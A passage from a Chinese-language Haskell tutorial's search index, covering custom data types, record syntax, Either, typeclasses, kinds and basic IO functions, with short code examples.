\u63a5\u6536\u4e09\u4e2a\u53c2\u6570\u90fd\u662f Float \u7c7b\u578b\uff0cRectangle \u63a5\u6536\u56db\u4e2a Float \u7c7b\u578b\u53c2\u6570\u3002 \u5982\u679c\u67e5\u770b Circle \u7684\u7c7b\u578b\uff0c\u5c06\u8fd4\u56de\uff1a Circle :: Float -> Float -> Float -> Shape \u5982\u679c\u60f3\u8981\u8ba9\u5b83\u80fd\u7ed9\u76f4\u63a5\u663e\u793a\u51fa\u6765\uff0c\u9700\u8981\u8ba9\u5b83\u5c5e\u4e8e Show \u7c7b\u578b\u7c7b\u3002\u5728\u4ee3\u7801\u4e2d\u53ea\u9700\u8981\u5728\u7ed3\u5c3e\u52a0\u4e0a deriving (Show) : data Shape = Circle Float Float Float | Rectangle Float Float Float Float deriving ( Show ) \u7c7b\u578b\u7684\u540d\u79f0\u548c\u503c\u6784\u9020\u5668\u540d\u79f0\u4e5f\u53ef\u4ee5\u76f8\u540c\uff0c\u6bd4\u5982\uff1a data Point = Point Float Float deriving ( Show )","title":"\u5b9a\u4e49\u65b0 Type"},{"location":"cs/pl/haskell/#type_1","text":"\u5728\u6587\u4ef6\u4e2d\u5b9a\u4e49\u4e86\u65b0\u7684 Type \u4e4b\u540e\uff0c\u5982\u679c\u5728\u522b\u7684\u6587\u4ef6\u4e2d\u5c06\u5176\u4f5c\u4e3a\u6a21\u5757\u5bfc\u5165\uff0c\u5219\u9700\u8981\u5148\u5bfc\u51fa\u3002\u6bd4\u5982\u6587\u4ef6 Shapes.hs \u4e2d\u5b9a\u4e49\u4e86 Shape \u548c Point\uff0c\u4ee5\u53ca\u5176\u4ed6\u7684\u4e00\u4e9b\u51fd\u6570\uff0c\u90a3\u4e48\u6587\u4ef6\u5f00\u5934\u9700\u8981\u5199\uff1a module Shapes ( Shape ( .. ) , Point ( .. ) , functionA , functionB ) where \u5176\u4e2d\u7684 Shape(..) \u5bfc\u51fa\u4e86 Shape \u7c7b\u578b\u548c\u5b83\u6240\u6709\u7684\u503c\u6784\u9020\u5668\uff0c .. \u4ee3\u8868\u4e86\u5b83\u7684\u6240\u6709\u503c\u6784\u9020\u5668\u3002\u56e0\u6b64\uff0c Shape(..) \u76f8\u5f53\u4e8e Shape (Circle, Rectangle) \u3002 \u5982\u679c\u4e0d\u60f3\u8981\u5bfc\u51fa\u503c\u6784\u9020\u5668\uff0c\u5373\u4e0d\u5141\u8bb8\u4f7f\u7528\u503c\u6784\u9020\u5668\u7684\u65b9\u6cd5\u6765\u521b\u5efa Shape \u7c7b\u578b\u7684\u53d8\u91cf\u3002\u90a3\u4e48\u9700\u8981\u5c06 Shape(..) \u66ff\u6362\u4e3a Shape \uff0c\u8fd9\u6837\u5c31\u53ea\u5bfc\u51fa\u4e86 Shape \u7c7b\u578b\uff0c\u800c\u4e0d\u5bfc\u51fa\u5176\u503c\u6784\u9020\u5668\u3002","title":"\u5bfc\u51fa Type"},{"location":"cs/pl/haskell/#record-syntax","text":"\u5982\u679c\u60f3\u8981\u65b9\u4fbf\u5730\u53d6\u51fa\u7c7b\u578b\u5b9e\u4f8b\u4e2d\u7684\u53c2\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528 Record \u8bed\u6cd5\uff0c\u5982\uff1a data Point = Point { xcoord :: Float , ycoord :: Float } deriving ( Show ) \u5728\u503c\u6784\u9020\u5668\u7684\u53c2\u6570\u90e8\u5206\u5148\u52a0\u4e00\u4e2a\u5927\u62ec\u53f7\uff0c\u7136\u540e\u6307\u5b9a\u53d6\u51fa\u503c\u7684\u51fd\u6570\u540d\u79f0\uff08xcoord, ycoord\uff09\uff0c\u540e\u9762\u6307\u5b9a\u7c7b\u578b\uff08:: Float\uff09\u3002\u8fd9\u6837 xcoord \u548c ycoord \u5c31\u90fd\u662f\u4e00\u4e2a\u7c7b\u578b\u4e3a Point -> Float \u7684\u51fd\u6570\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u65b9\u6cd5\u6765\u8bbf\u95ee\u503c\uff1a ghci > let point = Point 1.0 2.0 ghci > xcoord point 1.0 ghci > ycoord point 2.0 \u540c\u65f6\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u65b9\u6cd5\u6765\u521b\u5efa\u8fd9\u4e2a point\uff1a point = Point { ycoord = 2.0 , xcoord = 1.0 }","title":"Record Syntax"},{"location":"cs/pl/haskell/#type-parameters","text":"\u503c\u6784\u9020\u5668\u53ef\u4ee5\u63a5\u6536\u53c2\u6570\uff0c\u7c7b\u578b\u4e5f\u53ef\u4ee5\u63a5\u6536\u53c2\u6570\uff0c\u8fd9\u6837\u5b83\u5c31\u6210\u4e3a\u4e86\u7c7b\u578b\u6784\u9020\u5668\uff08type constructors\uff09\u3002\u5982 Maybe \u7684\u5b9a\u4e49\uff1a data Maybe a = Nothing | Just a \u5b83\u7684\u503c\u662f Nothing \u65f6\uff0c\u7c7b\u578b\u4e3a Maybe a\uff0c\u662f\u591a\u6001\u7684\uff08polymorphic\uff09\u3002 \u5b83\u7684\u503c\u4e0d\u662f Nothing \u65f6\uff0c\u7c7b\u578b\u53d6\u51b3\u4e8e\u503c Just a \u4e2d a \u7684\u7c7b\u578b\uff0c\u53ef\u4ee5\u6784\u9020\u51fa Maybe Int\u3001Maybe [Char] \u7b49\u591a\u79cd\u7c7b\u578b\uff1a Nothing :: Maybe a Just 1 :: Num a => Maybe a Just 'a' :: Maybe Char Just \"abc\" :: Maybe [ Char ] \u53ef\u4ee5\u7528\u8fd9\u79cd\u65b9\u6cd5\u6539\u5199 Point\uff1a data Point x y = Point { xcoord :: x , ycoord :: y } deriving ( Show ) \u4f46\u4f7f\u7528\u7c7b\u578b\u53c2\u6570\uff08type parameters\uff09\u5e76\u4e0d\u662f\u603b\u662f\u65b9\u4fbf\uff0c\u6bd4\u5982\u5728\u58f0\u660e\u51fd\u6570\u7c7b\u578b\u7684\u65f6\u5019\u4e0d\u80fd\u53ea\u4f7f\u7528 Point \u6765\u8868\u793a Point \u7c7b\u578b\uff0c\u800c\u662f\u5fc5\u987b\u5199\u6210 Point Float Float\u3002 \u800c\u4e14\u4e0d\u80fd\u5728\u5b9a\u4e49\u7c7b\u578b\u6784\u9020\u5668\u65f6\u6dfb\u52a0\u7c7b\u7ea6\u675f\uff08class constraint\uff09\uff0c\u4e0d\u7136\u5728\u4e4b\u540e\u58f0\u660e\u51fd\u6570\u7c7b\u578b\u7684\u65f6\u5019\u4e5f\u90fd\u9700\u8981\u6dfb\u52a0\u7c7b\u7ea6\u675f\uff0c\u5982\uff1a data ( Ord k ) => Map k v = ... toList :: ( Ord k ) => Map k a -> [( k , a )]","title":"Type parameters"},{"location":"cs/pl/haskell/#either","text":"Either \u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u5b83\u6709\u4e24\u4e2a\u503c\u6784\u9020\u5668\uff0c\u5b9a\u4e49\u662f\uff1a data Either a b = Left a | Right b deriving ( Eq , Ord , Read , Show ) \u5982\u679c\u4f7f\u7528\u4e86 Left\uff0c\u90a3\u5b83\u7684 a \u7684\u7c7b\u578b\u5c31\u662f\u5177\u4f53\u7684\uff1b\u5982\u679c\u4f7f\u7528\u4e86 Right\uff0c\u90a3\u5b83\u7684 b \u7684\u7c7b\u578b\u5c31\u662f\u5177\u4f53\u7684\uff1a ghci > Right 20 Right 20 ghci > Left \"w00t\" Left \"w00t\" ghci > : t Right 'a' Right 'a' :: Either a Char ghci > : t Left True Left True :: Either Bool b Either \u53ef\u4ee5\u770b\u4f5c Maybe \u7684\u8865\u5145\uff0c\u6bd4\u5982 Maybe \u5728\u4f7f\u7528\u65f6\uff0c\u51fa\u73b0\u5f02\u5e38\u53ef\u4ee5\u8fd4\u56de Nothing\uff0c\u4f46\u53ea\u662f\u4e00\u4e2a Nothing\uff0c\u4e0d\u5305\u542b\u4efb\u4f55\u4fe1\u606f\uff1b\u4f46 Either \u5305\u542b\u5de6\u503c\u548c\u53f3\u503c\uff0c\u6b63\u5e38\u7ed3\u679c\u8fd4\u56de\u53f3\u503c\uff0c\u800c\u51fa\u73b0\u5f02\u5e38\u5c31\u53ef\u4ee5\u8fd4\u56de\u5305\u542b\u9519\u8bef\u4fe1\u606f\u7684\u5de6\u503c\uff0c\u6bd4\u5982\u5b89\u5168\u9664\u6cd5\uff1a safeDiv :: Int -> Int -> Maybe Int safeDiv _ 0 = Nothing safeDiv x y = Just ( x ` div ` y ) ghci > safeDiv 4 2 Just 2 ghci > safeDiv 1 0 Nothing \u800c\u4f7f\u7528 Either\uff1a safeDiv :: Int -> Int -> Either String Int safeDiv _ 0 = Left \"Divided by zero\" safeDiv x y = Right ( x ` div ` y ) ghci > safeDiv 4 2 Right 2 ghci > safeDiv 1 0 Left \"Divided by zero\"","title":"Either"},{"location":"cs/pl/haskell/#derived-instances","text":"\u60f3\u8981\u4f7f\u4e00\u4e2a\u5b9a\u4e49\u7684\u7c7b\u6ee1\u8db3\u67d0\u4e9b Typeclass \u7684\u9700\u6c42\uff0c\u9700\u8981\u4ece\u5176\u6d3e\u751f\uff08derive\uff09\uff0c\u6bd4\u5982\uff1a data Day = Monday | Tuesday | Wednesday | Thursday | Friday | Saturday | Sunday deriving ( Eq , Ord , Show , Read , Bounded , Enum ) \u8fd9\u6837 Day \u7c7b\u578b\u7684\u503c\uff08Monday\uff5eSunday\uff09\u4e4b\u95f4\u5c31\u53ef\u4ee5\u6bd4\u8f83\u662f\u5426\u76f8\u7b49\uff08\u4ece Eq \u6d3e\u751f\uff09\uff0c\u6bd4\u8f83\u5927\u5c0f\uff08\u4ece Ord \u6d3e\u751f\uff0c\u5de6\u4fa7\u4e3a\u5c0f\uff0c\u53f3\u4fa7\u4e3a\u5927\uff09\uff0c\u663e\u793a\u6210\u5b57\u7b26\u4e32\uff08\u4ece Show \u6d3e\u751f\uff09\uff0c\u4ece\u5b57\u7b26\u4e32\u4e2d\u8bfb\u53d6\uff08\u4ece Read \u6d3e\u751f\uff09\uff0c\u5305\u542b\u8fb9\u754c\uff08\u4ece Bounded \u6d3e\u751f\uff09\uff0c\u53ef\u4ee5\u679a\u4e3e\uff08\u4ece Enum \u6d3e\u751f\uff0c\u6309\u7167\u503c\u6784\u9020\u5668\u4e2d\u7684\u987a\u5e8f\u4f9d\u6b21\u5411\u53f3\uff09","title":"Derived instances"},{"location":"cs/pl/haskell/#type-synonyms","text":"\u4e3a\u4e86\u9605\u8bfb\u65b9\u4fbf\uff0c\u4e66\u5199\u7b80\u4fbf\uff0c\u53ef\u4ee5\u4f7f\u7528 type \u5173\u952e\u5b57\u4e3a\u5df2\u6709\u7c7b\u578b\u521b\u5efa\u522b\u540d\uff08synonyms\uff09\u3002\u6bd4\u5982 String \u7684\u5b9a\u4e49\uff1a type String = [Char] \u5728\u6240\u6709\u9700\u8981\u4f7f\u7528\u5b57\u7b26\u4e32\uff08\u5373 [Char]\uff09\u7684\u5730\u65b9\u90fd\u53ef\u4ee5\u4f7f\u7528 String \u6765\u4ee3\u66ff\uff0c\u5b83\u4eec\u662f\u5b8c\u5168\u4e00\u81f4\u7684\uff0c\u53ea\u662f String \u66f4\u7b80\u4fbf\u6613\u8bfb\u3002 \u540c\u65f6\uff0c\u7c7b\u578b\u522b\u540d\u4e5f\u53ef\u4ee5\u63a5\u6536\u7c7b\u578b\u53c2\u6570","title":"Type synonyms"},{"location":"cs/pl/haskell/#newtype-keyword","text":"\u9664\u4e86 data \u3001 type \u5173\u952e\u5b57\u4e4b\u5916\uff0c\u8fd8\u53ef\u4ee5\u7528 newtype \u5173\u952e\u5b57\u6765\u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684\u7c7b\u578b\uff0c\u6bd4\u5982 Control.Applicative \u6a21\u5757\u4e2d\u7684 ZipList\uff1a newtype ZipList a = { getZipList :: [ a ] } - \u4e0d\u540c\u4e8e type\uff0c\u5b83\u4e0d\u662f\u522b\u540d\uff0c\u53ef\u4ee5\u4f7f\u7528 record \u8bed\u6cd5\u6765\u76f4\u63a5\u5b9a\u4e49\u53d6\u51fa\u503c\u7684\u51fd\u6570 - \u4e0d\u540c\u4e8e data\uff0c\u5b83\u53ea\u80fd\u6709\u4e00\u4e2a\u503c\u6784\u9020\u5668\uff0c\u4f46\u662f\u901f\u5ea6\u8981\u6bd4 data \u5feb\uff0c\u800c\u4e14\u66f4\u52a0\u61d2\u60f0","title":"newtype keyword"},{"location":"cs/pl/haskell/#recursive-data-structures","text":"\u4e00\u4e2a\u7c7b\u578b\u4e5f\u53ef\u4ee5\u9012\u5f52\u5b9a\u4e49\uff0c\u6bd4\u5982\u4e00\u9897\u4e8c\u53c9\u6811\uff1a data Tree a = EmptyTree | Node a ( Tree a ) ( Tree a ) deriving ( Show , Read , Eq )","title":"Recursive data structures"},{"location":"cs/pl/haskell/#typeclass","text":"\u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684 Typeclass \u9700\u8981\u4f7f\u7528 class \u5173\u952e\u5b57\uff0c\u4f8b\u5982\u5b9a\u4e49 Eq \u7c7b\u578b\u7c7b\uff1a class Eq a where ( == ) :: a -> a -> Bool ( /= ) :: a -> a -> Bool x == y = not ( x /= y ) x /= y = not ( x == y ) \u5176\u4e2d a \u662f\u4e00\u4e2a\u7c7b\u578b\u53d8\u91cf\uff0c\u524d\u4e24\u884c\u58f0\u660e\u4e86\u9700\u8981\u5b9e\u73b0\u7684\u51fd\u6570\u7684\u540d\u5b57\u53ca\u5176\u7c7b\u578b\uff0c\u540e\u4e24\u884c\u8868\u660e\u4e86\u9700\u8981\u7684\u51fd\u6570\u4e4b\u95f4\u53ef\u4ee5\u76f8\u4e92\u5b9a\u4e49\uff08\u4e0d\u5fc5\u8981\uff09\u3002 \u5305\u542b\u4e86\u540e\u4e24\u884c\u4e4b\u540e\uff0c\u53ea\u5b9a\u4e49 (==) \u51fd\u6570\u6216\u8005 (/=) \u51fd\u6570\u90fd\u53ef\u4ee5\u5b8c\u6210\u5168\u90e8\u5b9a\u4e49\uff0c\u5b83\u4eec\uff08 (==) | (/=) \uff09\u6210\u4e3a\u8fd9\u4e2a\u7c7b\u578b\u7c7b\u7684\u6700\u5c0f\u5b8c\u6574\u5b9a\u4e49\uff08minimal complete definition\uff09 \u67e5\u770b\u4e00\u4e2a\u7c7b\u578b\u7c7b\u7684\u6210\u5458\u9700\u8981\u5b9e\u73b0\u7684\u51fd\u6570\u53ef\u4ee5\u5728 GHCi \u4e2d\u4f7f\u7528 :info \uff1a ghci> :info Eq","title":"\u5b9a\u4e49\u65b0 Typeclass"},{"location":"cs/pl/haskell/#_4","text":"\u4f7f\u4e00\u4e2a\u7c7b\u578b\u6210\u4e3a\u4e00\u4e2a\u7c7b\u578b\u7c7b\u7684\u5b9e\u4f8b\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 deriving \u6765\u81ea\u52a8\u5b8c\u6210\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528 instance \u5173\u952e\u5b57\u6765\u624b\u52a8\u5b8c\u6210\u3002\u6bd4\u5982\u4f7f Point \u6210\u4e3a Show \u7684\u5b9e\u4f8b\uff1a instance Show Point where show ( Point x y ) = \"(\" ++ show x ++ \", \" ++ show y ++ \")\" -- in ghci ghci > Point 1.0 2.0 ( 1.0 , 2.0 ) \u8fd9\u6837\u5c31\u53ef\u4ee5\u81ea\u5b9a\u4e49\u663e\u793a\u7684\u5185\u5bb9\uff0c\u5426\u5219\u4f7f\u7528 deriving \u7684\u8bdd\u53ea\u4f1a\u76f4\u63a5\u5c06\u5176\u8f6c\u5316\u4e3a\u5b57\u7b26\u4e32\u3002 \u540c\u65f6\u4e5f\u8981\u6ce8\u610f\u7c7b\u578b\u548c\u7c7b\u578b\u6784\u9020\u5668\u7684\u533a\u522b\uff0c\u4f20\u5165\u7ed9 instance \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5e94\u8be5\u4e3a\u7c7b\u578b\u800c\u4e0d\u662f\u7c7b\u578b\u6784\u9020\u5668\uff0c\u6bd4\u5982 Maybe\uff1a instance Eq Maybe where ... -- \u9519\u8bef\u7528\u6cd5\uff0c\u56e0\u4e3aMaybe\u662f\u7c7b\u578b\u6784\u9020\u5668\u800c\u4e0d\u662f\u7c7b\u578b instance Eq ( Maybe m ) where ... -- \u9519\u8bef\u7528\u6cd5\uff0c\u56e0\u4e3am\u4e0d\u4e00\u5b9a\u662fEq\u7684\u6210\u5458 instance ( Eq m ) => Eq ( Maybe m ) where Just x == Just y = x == y Nothing == Nothing = True _ == _ = False","title":"\u624b\u52a8\u521b\u5efa\u5b9e\u4f8b"},{"location":"cs/pl/haskell/#functor-typeclass","text":"Functor \u4e5f\u662f\u4e00\u79cd\u7c7b\u578b\u7c7b\uff0c\u5b83\u53ea\u89c4\u5b9a\u4e86\u4e00\u4e2a\u51fd\u6570\uff1a class Functor f where fmap :: ( a -> b ) -> f a -> f b \u5176\u4e2d f \u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b","title":"Functor Typeclass"},{"location":"cs/pl/haskell/#kinds","text":"\u4e00\u4e2a\u503c\u7684\u7c7b\u578b\u53eb\u505a\u7c7b\u578b\uff08Type\uff09\uff0c\u800c\u4e00\u4e2a\u7c7b\u578b\u7684\u7c7b\u578b\u53eb\u505a Kind\u3002\u53ef\u4ee5\u901a\u8fc7 GHCi \u4e2d :k \u6765\u67e5\u770b Kind\uff1a ghci > : k Int Int :: * ghci > : k Maybe Maybe :: * -> * ghci > : k Maybe Int Maybe Int :: * ghci > : k Either Either :: * -> * -> * \u5176\u4e2d\u7684\u661f\u53f7 * \u4ee3\u8868\u4e86\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\uff08concrete type\uff09\u3002Int \u672c\u8eab\u5c31\u662f\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\uff0c\u6240\u4ee5 Int \u7684 Kind \u662f *\u3002\u800c Maybe \u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u5b83\u63a5\u6536\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u5177\u4f53\u7c7b\u578b\uff0c\u6240\u4ee5 Maybe \u7684 Kind \u662f * -> *\u3002\u5982\u679c\u7ed9 Maybe \u4f20\u5165\u4e86\u4e00\u4e2a Int\uff0c\u90a3\u4e48\u5f97\u5230\u7684 Maybe Int \u5c31\u662f\u4e00\u4e2a\u5177\u4f53\u7684\u7c7b\u578b\uff0c\u5b83\u7684 Kind \u5c31\u662f *\u3002Either \u4e5f\u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u4f46\u5b83\u63a5\u6536\u4e24\u4e2a\u7c7b\u578b\u624d\u4ea7\u751f\u4e00\u4e2a\u65b0\u7684\u7c7b\u578b\uff0c\u6240\u4ee5 Either \u7684 Kind \u662f * -> * -> *\u3002","title":"Kinds"},{"location":"cs/pl/haskell/#inputoutput","text":"","title":"Input/Output"},{"location":"cs/pl/haskell/#haskell","text":"\u4e0d\u5728 GHCi \u4e2d\u8fd0\u884c\u4e00\u4e2a Haskell \u7a0b\u5e8f\u6709\u4e24\u79cd\u65b9\u5f0f\uff1a \u7f16\u8bd1\u8fd0\u884c\uff1a $ ghc --make code $ ./code \u901a\u8fc7 runhaskell \u547d\u4ee4\u76f4\u63a5\u8fd0\u884c\uff1a $ runhaskell code.hs","title":"\u8fd0\u884c Haskell \u7a0b\u5e8f"},{"location":"cs/pl/haskell/#_5","text":"\u5728\u4e00\u4e2a Haskell \u7a0b\u5e8f\u4e2d\u8f93\u51fa\u6587\u5b57\u9700\u8981\u5b9a\u4e49\u4e00\u4e2a main \u51fd\u6570\uff1a main = putStrLn \"Hello World\" \u5176\u4e2d putStrLn \u7684\u7c7b\u578b\u662f\uff1a putStrLn :: String -> IO () putStrLn \u63a5\u6536\u4e00\u4e2a String \u7c7b\u578b\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a\u7ed3\u679c\u4e3a () \u7c7b\u578b\u7684 IO \u52a8\u4f5c\uff08I/O action\uff09\u3002\u6240\u4ee5 main \u51fd\u6570\u7684\u7c7b\u578b\u4e3a IO ()\u3002\uff08IO \u7684 Kind \u662f* -> *\uff09 \u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u5176\u4ed6\u9ed8\u8ba4\u63d0\u4f9b\u7684\u8f93\u51fa\u6587\u672c\u7684\u51fd\u6570\uff1a putStr \uff1a\u8f93\u51fa\u6587\u672c\uff0c\u7ed3\u5c3e\u4e0d\u6362\u884c putChar \uff1a\u8f93\u51fa\u5355\u4e2a\u5b57\u7b26\uff0c\u7ed3\u5c3e\u4e0d\u6362\u884c\u3002\u63a5\u6536\u7684\u53c2\u6570\u4e3a\u5355\u4e2a Char\uff0c\u4e0d\u662f String\uff08\u7528\u5355\u5f15\u53f7\u4e0d\u662f\u53cc\u5f15\u53f7\uff09 print \uff1a\u53ef\u4ee5\u63a5\u6536\u4efb\u4f55 Show \u7684\u6210\u5458\uff0c\u5148\u7528 show \u8f6c\u5316\u4e3a\u5b57\u7b26\u4e32\u7136\u540e\u8f93\u51fa\u3002\u7b49\u540c\u4e8e putStrLn . show","title":"\u8f93\u51fa\u6587\u672c"},{"location":"cs/pl/haskell/#do-block","text":"\u5728 main \u51fd\u6570\u4e2d\u4f7f\u7528\u591a\u4e2a putStrLn \u9700\u8981\u4f7f\u7528 do \u8bed\u53e5\uff1a main = do putStrLn \"Line1\" putStrLn \"Line2\" \u5176\u4e2d\u6700\u540e\u4e00\u884c\u4e00\u5b9a\u8981\u8fd4\u56de IO () \u7c7b\u578b\u7684\u503c","title":"do block"},{"location":"cs/pl/haskell/#_6","text":"\u8f93\u5165\u6587\u5b57\u9700\u8981\u5728 do \u5757\u4e2d\u4f7f\u7528 getLine\uff1a main = do line <- getLine putStrLn line getLine \u7684\u7c7b\u578b\u662f\uff1a getLine :: IO String \u800c <- \u64cd\u4f5c\u7b26\u5c06 getLine \u4e2d\u7684 String \u63d0\u53d6\u4e86\u51fa\u6765\u7ed9\u5230\u4e86 line\uff0c\u4f7f line \u53d8\u6210\u4e86 String \u7c7b\u578b\u7684\u4e00\u4e2a\u5b57\u7b26\u4e32 \u800c\u4e14\u4f7f\u7528\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u5fc5\u987b\u8981\u7ecf\u8fc7\u4e00\u6b21 <-\uff0c\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528 getLine \u4f5c\u4e3a\u5b57\u7b26\u4e32\uff0c\u56e0\u4e3a getLine \u4e0d\u662f String \u7c7b\u578b\uff0c\u800c\u662f IO String \u7c7b\u578b \u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528 getChar \u6765\u83b7\u53d6\u5355\u4e2a\u5b57\u7b26\uff0c\u4f46\u4ecd\u7136\u9700\u8981\u4f7f\u7528 <- \u64cd\u4f5c\u7b26\u6765\u63d0\u53d6 Char","title":"\u8f93\u5165\u6587\u672c"},{"location":"cs/pl/haskell/#io","text":"","title":"\u5176\u4ed6 IO \u76f8\u5173\u51fd\u6570\u7528\u6cd5"},{"location":"cs/pl/haskell/#return","text":"Haskell \u4e2d\u7684 return \u548c\u5176\u4ed6\u547d\u4ee4\u5f0f\u8bed\u8a00\u4e2d\u7684 return \u5b8c\u5168\u4e0d\u540c\uff0c\u5b83\u4e0d\u4f1a\u4f7f\u51fd\u6570\u76f4\u63a5\u7ed3\u675f\u5e76\u8fd4\u56de\u4e00\u4e2a\u503c\u3002 main \u51fd\u6570\u5fc5\u987b\u5b9a\u4e49\u4e3a\u7c7b\u578b\u4e3a IO () \u7684\u51fd\u6570\uff0c\u6240\u4ee5\u5728 main \u51fd\u6570\u4e2d\u4f7f\u7528 if \u8bed\u53e5\uff0c\u5982\u679c\u4e0d\u8f93\u51fa\u7684\u8bdd\u4e5f\u4e0d\u53ef\u4ee5\u76f4\u63a5\u653e\u4e0b\u4ec0\u4e48\u90fd\u4e0d\u5e72\uff0c\u56e0\u4e3a\u8fd9\u65f6\u5019 main \u51fd\u6570\u7684\u7c7b\u578b\u4e0d\u662f IO ()\u3002\u6240\u4ee5\u8fd9\u65f6\u9700\u8981\u4f7f\u7528 return () \u6765\u4e3a main \u51fd\u6570\u6307\u5b9a\u4e3a IO () \u7c7b\u578b\uff0c\u4f8b\u5982\uff1a main = do line <- getLine if null line then return () -- <-\u8fd9\u91cc else do ... \u4f7f\u7528 <- \u64cd\u4f5c\u7b26\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5c06 return \u8bed\u53e5\u4e2d\u7684\u5185\u5bb9\u63d0\u53d6\u51fa\u6765\uff0c\u6bd4\u5982 a <- return 'A'\uff0c\u6267\u884c\u540e a \u5c31\u662f 'A'\u3002","title":"return"},{"location":"cs/pl/haskell/#when","text":"when \u5305\u542b\u5728 Control.Monad \u6a21\u5757\u4e2d\uff0c\u5b83\u8868\u793a\u5728\u6ee1\u8db3\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u6761\u4ef6\u4e0b\u4f1a\u6267\u884c\u7b2c\u4e8c\u4e2a\u51fd\u6570\uff0c\u5426\u5219\u4f1a return ()\u3002\u6bd4\u5982\uff1a import Control.Monad main = do c <- getChar when ( c /= ' ' ) $ do putChar c main \u7b49\u540c\u4e8e\uff1a main = do c <- getChar if c /= ' ' then do putChar c main else return ()","title":"when"},{"location":"cs/pl/haskell/#sequence","text":"sequence \u5728 IO \u4e2d\u4f7f\u7528\u65f6\u53ef\u4ee5\u8fbe\u6210 [IO a] -> IO [a] \u7684\u6548\u679c\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528\u4f5c\uff1a [ a , b , c ] <- sequence [ getLine , getLine , getLine ]","title":"sequence"},{"location":"cs/pl/haskell/#mapm-mapm_","text":"\u5728 IO \u76f8\u5173\u7684\u5730\u65b9\u4f7f\u7528 map\uff0c\u53ef\u4ee5\u4f7f\u7528 mapM \u548c mapM_\uff0c\u5176\u4e2d mapM \u6709\u8fd4\u56de\u503c\u800c mapM_ \u76f4\u63a5\u6254\u6389\u4e86\u8fd4\u56de\u503c\uff1a ghci > mapM print [ 1 , 2 , 3 ] 1 2 3 [ () , () , () ] ghci > mapM_ print [ 1 , 2 , 3 ] 1 2 3","title":"mapM &amp; mapM_"},{"location":"cs/pl/haskell/#forever","text":"forever \u51fd\u6570\u5305\u542b\u5728 Control.Monad \u6a21\u5757\u4e2d\u3002\u5728 main \u51fd\u6570\u5f00\u5934\u52a0\u4e0a forever \u51fd\u6570\u53ef\u4ee5\u4f7f\u540e\u9762\u7684 do \u5757\u4e00\u76f4\u91cd\u590d\u6267\u884c\u76f4\u5230\u7a0b\u5e8f\u88ab\u8feb\u7ec8\u6b62\uff0c\u5982\uff1a import Control.Monad main = forever $ do ...","title":"forever"},{"location":"cs/pl/haskell/#form","text":"forM \u51fd\u6570\u5305\u542b\u5728 Control.Monad \u6a21\u5757\u4e2d\uff0c\u5b83\u7684\u529f\u80fd\u548c mapM \u7c7b\u4f3c\uff0c\u4ece\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e2d\u9010\u4e2a\u53d6\u51fa\u5143\u7d20\u4f20\u5165\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff08\u4e00\u4e2a\u63a5\u6536\u4e00\u4e2a\u53c2\u6570\u7684\u51fd\u6570\uff09\u4e2d\uff0c\u5e76\u4e14\u7b2c\u4e8c\u4e2a\u53c2\u6570\u53ef\u4ee5\u8fd4\u56de IO a \u7c7b\u578b\u3002\u6bd4\u5982\uff1a import Control.Monad main = do colors <- forM [ 1 , 2 , 3 , 4 ] ( \\ a -> do putStrLn $ \"Which color do you associate with the number \" ++ show a ++ \"?\" color <- getLine return color ) putStrLn \"The colors that you associate with 1, 2, 3 and 4 are: \" mapM putStrLn colors","title":"forM"},{"location":"cs/pl/haskell/#getcontents","text":"getLine \u83b7\u53d6\u4e00\u6574\u884c\uff0c\u800c getContents \u4ece\u6807\u51c6\u8f93\u5165\u4e2d\u83b7\u53d6\u5168\u90e8\u5185\u5bb9\u76f4\u5230\u9047\u5230 EOF\uff0c\u5e76\u4e14\u5b83\u662f lazy \u7684\uff0c\u5728\u6267\u884c\u4e86 foo <- getContents \u540e\uff0c\u5b83\u5e76\u4e0d\u4f1a\u8bfb\u53d6\u6807\u51c6\u8f93\u5165\u5e76\u4e14\u8d4b\u503c\u5230 foo\uff0c\u800c\u662f\u7b49\u5230\u9700\u8981\u4f7f\u7528 foo \u7684\u65f6\u5019\u518d\u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6\u3002 getContents \u5728\u4f7f\u7528\u7ba1\u9053\u4f20\u5165\u6587\u5b57\u65f6\u5f88\u5e38\u7528\uff0c\u53ef\u4ee5\u4ee3\u66ff forever+getLine \u4f7f\u7528\uff0c\u6bd4\u5982\u4e00\u4e2a Haskell \u7a0b\u5e8f\u6587\u4ef6 code.hs\uff1a import Data.Char main = do contents <- getContents putStr ( map toUpper contents ) \u4f7f\u7528 ghc --make code \u7f16\u8bd1\u540e\uff0c\u901a\u8fc7\u7ba1\u9053\u4f20\u5165\u6587\u5b57\uff1a cat text.txt | ./code \u4f1a\u5c06 text.txt 